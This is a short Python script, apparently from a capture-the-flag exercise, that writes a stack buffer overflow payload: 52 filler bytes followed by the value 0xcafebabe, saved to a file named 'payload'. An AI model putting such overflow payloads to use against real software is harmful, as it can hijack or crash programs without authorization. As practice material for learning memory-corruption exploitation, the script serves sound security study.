res = b"A"*(32+5*4)+b'\xbe\xba\xfe\xca'

with open("payload", "wb") as f: 
     f.write(bytes(res))
